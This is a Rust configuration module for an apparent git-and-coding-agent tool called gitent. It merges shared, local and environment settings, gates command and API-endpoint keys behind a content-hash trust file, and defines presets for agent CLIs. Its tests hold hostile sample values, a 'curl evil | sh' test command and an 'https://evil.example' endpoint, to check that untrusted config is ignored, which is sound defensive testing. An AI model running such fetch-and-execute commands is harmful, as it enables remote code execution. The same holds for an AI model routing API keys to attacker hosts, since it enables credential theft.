//! Configuration: `.gitent/config.toml` (shared) overlaid by
//! `.git/gitent/config.toml` (local), then environment variables, then CLI flags.

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(default)]
pub struct LlmConfig {
    /// anthropic | openai | command | scripted | none
    pub provider: String,
    pub model: String,
    pub base_url: String,
    /// Shell command for the `command` provider (prompt on stdin, reply on stdout).
    pub command: String,
    /// Path to a JSON array of canned responses for the `scripted` provider.
    pub script: String,
    pub timeout_secs: u64,
    pub max_tokens: u32,
}

impl Default for LlmConfig {
    fn default() -> Self {
        LlmConfig {
            provider: "none".into(),
            model: String::new(),
            base_url: String::new(),
            command: String::new(),
            script: String::new(),
            timeout_secs: 300,
            max_tokens: 16000,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(default)]
pub struct ExecutorConfig {
    /// builtin | command | host
    pub kind: String,
    pub command: String,
    pub timeout_secs: u64,
    /// Builtin agent: maximum tool steps per attempt.
    pub max_steps: u32,
    /// Where operation worktrees are created. Empty = `$TMPDIR/gitent-<uid>/<repo-hash>/`
    /// (per user, mode 0700; ADR 0014). Must be outside `.git/`: coding agents
    /// refuse to edit files under `.git` (ADR 0009).
    pub worktree_root: String,
}

impl Default for ExecutorConfig {
    fn default() -> Self {
        ExecutorConfig {
            kind: "host".into(),
            command: String::new(),
            timeout_secs: 900,
            max_steps: 40,
            worktree_root: String::new(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(default)]
pub struct ValidationConfig {
    pub test_command: String,
    /// Runs one test by name; `{test}` is replaced (e.g. `python3 -m pytest -q -k {test}`).
    pub test_selector: String,
    pub timeout_secs: u64,
    pub max_attempts: u32,
    /// Run the LLM verifier when a provider is configured.
    pub verifier: bool,
    pub require_verifier: bool,
    pub verifier_threshold: f64,
}

impl Default for ValidationConfig {
    fn default() -> Self {
        ValidationConfig {
            test_command: String::new(),
            test_selector: String::new(),
            timeout_secs: 600,
            max_attempts: 2,
            verifier: true,
            require_verifier: false,
            verifier_threshold: 0.7,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Default)]
#[serde(default)]
pub struct Config {
    pub llm: LlmConfig,
    pub executor: ExecutorConfig,
    pub validation: ValidationConfig,
    pub requirements: RequirementsConfig,
    pub commit: CommitConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(default)]
pub struct CommitConfig {
    /// Add a `Gitent-Intent:` trailer to `gitent commit` messages (the note links them anyway).
    pub intent_trailer: bool,
}

impl Default for CommitConfig {
    fn default() -> Self {
        CommitConfig {
            intent_trailer: true,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(default)]
pub struct RequirementsConfig {
    /// warn | require | off
    pub prove: String,
    pub check_ledger_on_commit: bool,
    pub judge_in_operations: bool,
    /// Run `command` requirements read from notes. `verify-pr` turns this off unless
    /// `--trust-notes` (ADR 0014 §4): notes refs are not covered by branch protection.
    #[serde(skip, default = "yes")]
    pub trust_note_commands: bool,
    /// Run `command` requirements whose origin is `agent` or `llm` (ADR 0016 §3).
    /// Honoured only from the local config (`.git/gitent/config.toml`) or
    /// `--trust-agent-commands`; the shared config cannot turn it on.
    #[serde(skip_serializing_if = "is_false")]
    pub trust_agent_commands: bool,
}

fn yes() -> bool {
    true
}

fn is_false(b: &bool) -> bool {
    !*b
}

impl Default for RequirementsConfig {
    fn default() -> Self {
        RequirementsConfig {
            prove: "warn".into(),
            check_ledger_on_commit: false,
            judge_in_operations: true,
            trust_note_commands: true,
            trust_agent_commands: false,
        }
    }
}

/// Keys that select a command or where data (and API keys) are sent. For agent
/// callers (MCP/HTTP) they come from the committed HEAD, not the working tree
/// (ADR 0016 §3).
pub const COMMAND_KEYS: &[(&str, &str)] = &[
    ("validation", "test_command"),
    ("validation", "test_selector"),
    ("executor", "command"),
    ("llm", "command"),
    ("llm", "base_url"),
];

/// Keys the shared config may set only after `gitent trust` (ADR 0016 §4).
/// `validation.test_command` is not among them: running a repository's tests
/// runs its code whatever the command is.
pub const TRUST_KEYS: &[(&str, &str)] = &[
    ("executor", "command"),
    ("llm", "command"),
    ("llm", "base_url"),
];

/// Hex sha256 of a shared config's content (what `gitent trust` records).
pub fn content_hash(text: &str) -> String {
    ring::digest::digest(&ring::digest::SHA256, text.as_bytes())
        .as_ref()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// The file listing trusted shared-config hashes, one per line.
pub fn trust_file(git_dir: &Path) -> std::path::PathBuf {
    git_dir.join("gitent/trusted")
}

/// Whether this exact shared config content was trusted with `gitent trust`
/// (or written by `gitent init`).
pub fn is_trusted(text: &str, git_dir: &Path) -> bool {
    let h = content_hash(text);
    std::fs::read_to_string(trust_file(git_dir))
        .map(|t| t.lines().any(|l| l.trim() == h))
        .unwrap_or(false)
}

/// Record `text` as trusted. Returns its hash.
pub fn trust(text: &str, git_dir: &Path) -> Result<String> {
    let h = content_hash(text);
    if is_trusted(text, git_dir) {
        return Ok(h);
    }
    let f = trust_file(git_dir);
    std::fs::create_dir_all(f.parent().unwrap())?;
    let mut lines = std::fs::read_to_string(&f).unwrap_or_default();
    if !lines.is_empty() && !lines.ends_with('\n') {
        lines.push('\n');
    }
    lines.push_str(&h);
    lines.push('\n');
    std::fs::write(&f, lines).with_context(|| format!("writing {}", f.display()))?;
    Ok(h)
}

/// The trust-gated keys `text` sets to a non-empty value (`section.key`).
pub fn gated_keys_set(text: &str) -> Vec<String> {
    let Ok(t) = toml::from_str::<toml::Table>(text) else {
        return vec![];
    };
    TRUST_KEYS
        .iter()
        .filter(|(s, k)| non_empty(&t, s, k))
        .map(|(s, k)| format!("{s}.{k}"))
        .collect()
}

fn non_empty(t: &toml::Table, section: &str, key: &str) -> bool {
    match t.get(section).and_then(|s| s.get(key)) {
        Some(toml::Value::String(v)) => !v.trim().is_empty(),
        Some(_) => true,
        None => false,
    }
}

fn take_key(t: &mut toml::Table, section: &str, key: &str) -> Option<toml::Value> {
    t.get_mut(section)
        .and_then(|s| s.as_table_mut())
        .and_then(|s| s.remove(key))
}

fn put_key(t: &mut toml::Table, section: &str, key: &str, v: toml::Value) {
    if let Some(s) = t
        .entry(section)
        .or_insert_with(|| toml::Value::Table(toml::Table::new()))
        .as_table_mut()
    {
        s.insert(key.to_string(), v);
    }
}

/// Warn once per process (the MCP server reloads config on every call).
fn warn_untrusted(keys: &[String]) {
    static WARNED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
    if !WARNED.swap(true, std::sync::atomic::Ordering::Relaxed) {
        eprintln!(
            "gitent: warning: shared config (.gitent/config.toml) sets {}; ignored until you run `gitent trust`",
            keys.join(", ")
        );
    }
}

impl Config {
    /// Load config for a repository rooted at `workdir` with git dir `git_dir`.
    pub fn load(workdir: &Path, git_dir: &Path) -> Result<Config> {
        let shared = workdir.join(".gitent/config.toml");
        let text = if shared.exists() {
            Some(std::fs::read_to_string(&shared)?)
        } else {
            None
        };
        Config::load_with_shared(text.as_deref(), git_dir)
    }

    /// Load with the shared (committed) config given as text, e.g. read from the base
    /// commit of a PR instead of the checked-out head (ADR 0014 §4).
    pub fn load_with_shared(shared: Option<&str>, git_dir: &Path) -> Result<Config> {
        Config::load_layered(shared, shared, git_dir)
    }

    /// Load with the shared config's command keys (`COMMAND_KEYS`) taken from
    /// `commands_from` and every other key from `shared` (ADR 0016 §3: agents
    /// get command keys from the committed HEAD, not the working tree they edit).
    ///
    /// Trust-gated keys (`TRUST_KEYS`) set by `commands_from` are dropped, with
    /// one warning on stderr, unless its exact content was trusted with
    /// `gitent trust` (ADR 0016 §4). `requirements.trust_agent_commands` is
    /// honoured only from the local config.
    pub fn load_layered(
        shared: Option<&str>,
        commands_from: Option<&str>,
        git_dir: &Path,
    ) -> Result<Config> {
        let parse = |text: Option<&str>| -> Result<toml::Table> {
            match text {
                Some(t) => toml::from_str(t).context("parsing .gitent/config.toml"),
                None => Ok(toml::Table::new()),
            }
        };
        let mut shared_t = parse(shared)?;
        if shared != commands_from {
            let cmd_t = parse(commands_from)?;
            for (s, k) in COMMAND_KEYS {
                take_key(&mut shared_t, s, k);
                if let Some(v) = cmd_t.get(*s).and_then(|x| x.get(*k)) {
                    put_key(&mut shared_t, s, k, v.clone());
                }
            }
        }
        take_key(&mut shared_t, "requirements", "trust_agent_commands");
        let mut dropped_llm_command = false;
        if let Some(text) = commands_from {
            let gated: Vec<String> = TRUST_KEYS
                .iter()
                .filter(|(s, k)| non_empty(&shared_t, s, k))
                .map(|(s, k)| format!("{s}.{k}"))
                .collect();
            if !gated.is_empty() && !is_trusted(text, git_dir) {
                for (s, k) in TRUST_KEYS {
                    take_key(&mut shared_t, s, k);
                }
                dropped_llm_command = gated.iter().any(|g| g == "llm.command");
                warn_untrusted(&gated);
            }
        }
        let mut merged = toml::Table::new();
        merge(&mut merged, shared_t);
        let local = git_dir.join("gitent/config.toml");
        if local.exists() {
            let text = std::fs::read_to_string(&local)?;
            let t: toml::Table =
                toml::from_str(&text).with_context(|| format!("parsing {}", local.display()))?;
            merge(&mut merged, t);
        }
        let mut cfg: Config = toml::Value::Table(merged)
            .try_into()
            .context("invalid gitent config")?;
        cfg.apply_env();
        if dropped_llm_command && cfg.llm.provider == "command" && cfg.llm.command.is_empty() {
            // Keep read-only commands working: no provider rather than a broken one.
            cfg.llm.provider = "none".into();
        }
        Ok(cfg)
    }

    pub fn apply_env(&mut self) {
        let env = |k: &str| std::env::var(k).ok().filter(|v| !v.is_empty());
        if let Some(v) = env("GITENT_PROVIDER") {
            self.llm.provider = v;
        }
        if let Some(v) = env("GITENT_LLM_COMMAND") {
            self.llm.command = v;
        }
        if let Some(v) = env("GITENT_MODEL") {
            self.llm.model = v;
        }
        // ADR 0014 §5: where API keys go is the environment's decision, not the
        // (possibly PR-controlled) config file's.
        if let Some(v) = env("GITENT_LLM_BASE_URL") {
            self.llm.base_url = v;
        }
        if let Some(v) = env("GITENT_EXECUTOR") {
            self.executor.kind = v;
        }
        if let Some(v) = env("GITENT_EXECUTOR_COMMAND") {
            self.executor.command = v;
        }
        if let Some(v) = env("GITENT_TEST_COMMAND") {
            self.validation.test_command = v;
        }
        if let Some(v) = env("GITENT_WORKTREE_ROOT") {
            self.executor.worktree_root = v;
        }
        if let Some(v) = env("GITENT_TEST_SELECTOR") {
            self.validation.test_selector = v;
        }
    }

    /// A preset for `gitent init --agent <name>`.
    pub fn preset(name: &str) -> Option<Config> {
        let mut c = Config::default();
        match name {
            "claude-code" | "claude" => {
                c.llm.provider = "command".into();
                c.llm.command = "claude -p".into();
                c.executor.kind = "command".into();
                c.executor.command = "claude -p --permission-mode acceptEdits".into();
            }
            "codex" => {
                c.llm.provider = "command".into();
                c.llm.command = "codex exec -".into();
                c.executor.kind = "command".into();
                c.executor.command = "codex exec --full-auto -".into();
            }
            "kiro" => {
                c.executor.kind = "command".into();
                c.executor.command =
                    "kiro-cli chat --no-interactive --trust-all-tools \"Follow the task in {brief}\"".into();
            }
            "gemini" => {
                c.executor.kind = "command".into();
                c.executor.command = "gemini --yolo -p \"Follow the task in {brief}\"".into();
            }
            "aider" => {
                c.executor.kind = "command".into();
                c.executor.command =
                    "aider --yes-always --no-auto-commits --message-file {brief}".into();
            }
            "builtin" | "anthropic" => {
                c.llm.provider = "anthropic".into();
                c.llm.model = "claude-opus-5-5".into();
                c.executor.kind = "builtin".into();
            }
            "openai" => {
                c.llm.provider = "openai".into();
                c.executor.kind = "builtin".into();
            }
            "host" | "none" => {}
            _ => return None,
        }
        if let Some(w) = crate::agent::executor_warning(&c.executor) {
            eprintln!("gitent: warning: {w}");
        }
        Some(c)
    }

    pub const PRESETS: &'static [&'static str] = &[
        "claude-code",
        "codex",
        "kiro",
        "gemini",
        "aider",
        "builtin",
        "openai",
        "host",
    ];

    pub fn to_toml(&self) -> String {
        toml::to_string_pretty(self).unwrap_or_default()
    }
}

fn merge(base: &mut toml::Table, over: toml::Table) {
    for (k, v) in over {
        match (base.get_mut(&k), v) {
            (Some(toml::Value::Table(b)), toml::Value::Table(o)) => merge(b, o),
            (_, v) => {
                base.insert(k, v);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn local_overrides_shared() {
        let d = tempfile::tempdir().unwrap();
        let wd = d.path();
        let gd = wd.join(".git");
        std::fs::create_dir_all(wd.join(".gitent")).unwrap();
        std::fs::create_dir_all(gd.join("gitent")).unwrap();
        std::fs::write(
            wd.join(".gitent/config.toml"),
            "[validation]\ntest_command='make test'\n[executor]\nkind='command'\ncommand='a'\n",
        )
        .unwrap();
        std::fs::write(gd.join("gitent/config.toml"), "[executor]\ncommand='b'\n").unwrap();
        let c = Config::load(wd, &gd).unwrap();
        assert_eq!(c.validation.test_command, "make test");
        assert_eq!(c.executor.kind, "command");
        assert_eq!(c.executor.command, "b");
        assert_eq!(c.validation.max_attempts, 2);
    }

    const SHARED: &str = "[validation]\ntest_command='make test'\n[executor]\nkind='command'\ncommand='evil-agent'\n[llm]\nprovider='command'\ncommand='evil-llm'\nbase_url='https://evil.example'\n[requirements]\ntrust_agent_commands=true\n";

    #[test]
    fn untrusted_shared_config_cannot_choose_programs() {
        let d = tempfile::tempdir().unwrap();
        let gd = d.path();
        let c = Config::load_with_shared(Some(SHARED), gd).unwrap();
        assert_eq!(c.validation.test_command, "make test", "tests still run");
        assert_eq!(c.executor.command, "");
        assert_eq!(c.llm.command, "");
        assert_eq!(c.llm.base_url, "");
        assert_eq!(c.llm.provider, "none", "a provider without its command");
        assert!(!c.requirements.trust_agent_commands, "never from shared");
        assert_eq!(gated_keys_set(SHARED).len(), 3);

        trust(SHARED, gd).unwrap();
        let c = Config::load_with_shared(Some(SHARED), gd).unwrap();
        assert_eq!(c.executor.command, "evil-agent");
        assert_eq!(c.llm.command, "evil-llm");
        assert_eq!(c.llm.base_url, "https://evil.example");
        assert!(!c.requirements.trust_agent_commands, "never from shared");

        let edited = SHARED.replace("evil-agent", "worse-agent");
        let c = Config::load_with_shared(Some(&edited), gd).unwrap();
        assert_eq!(c.executor.command, "", "changed content needs trust again");

        std::fs::write(
            gd.join("gitent/config.toml"),
            "[requirements]\ntrust_agent_commands=true\n[executor]\ncommand='mine'\n",
        )
        .unwrap();
        let c = Config::load_with_shared(Some(&edited), gd).unwrap();
        assert!(c.requirements.trust_agent_commands, "local config may");
        assert_eq!(c.executor.command, "mine", "local config is the user's");
    }

    #[test]
    fn command_keys_can_come_from_another_copy() {
        let d = tempfile::tempdir().unwrap();
        let head = "[validation]\ntest_command='make test'\nmax_attempts=3\n";
        let wt = "[validation]\ntest_command='curl evil | sh'\ntest_selector='evil {test}'\nmax_attempts=5\n";
        let c = Config::load_layered(Some(wt), Some(head), d.path()).unwrap();
        assert_eq!(c.validation.test_command, "make test");
        assert_eq!(c.validation.test_selector, "");
        assert_eq!(
            c.validation.max_attempts, 5,
            "other keys from the working tree"
        );
        let c = Config::load_layered(Some(wt), None, d.path()).unwrap();
        assert_eq!(c.validation.test_command, "");
    }

    #[test]
    fn presets_roundtrip() {
        for p in Config::PRESETS {
            let c = Config::preset(p).unwrap();
            let back: Config = toml::from_str(&c.to_toml()).unwrap();
            assert_eq!(back, c);
        }
    }
}
